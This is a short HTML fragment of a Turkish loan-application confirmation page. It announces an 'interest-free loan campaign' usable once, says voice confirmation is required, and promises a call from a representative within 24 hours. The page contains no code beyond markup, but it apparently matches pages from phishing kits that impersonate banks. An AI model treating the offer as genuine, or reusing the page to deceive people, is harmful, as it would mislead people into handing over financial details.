      ...
      <div class="mx-auto" style="max-width: 30rem;">
        ...
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            <div class="mb-4">
              <img class="avatar avatar-xxl avatar-4x3" src="./asset/verflogo.png" style="width:150; margin-top: 20px;" alt="Image Description" data-hs-theme-appearance="default">
            ...
            <div class="mb-5">
              <h1 class="display-5">Kredi başvurunuz Alınmıştır.</h1>
              <p class="mb-0">Faizsiz Kredi Kampanyası'ndan 1 Defa Yararlanabilirsiniz.</p>
              <p class="mb-0">Sesli Teyit Alınması Gerekmektedir.</p>
              <p class="mb-0">24 Saat içerisinde Bireysel Müşteri Temsilciniz Sizinle İletişime Geçecektir.</p>
                    </div>
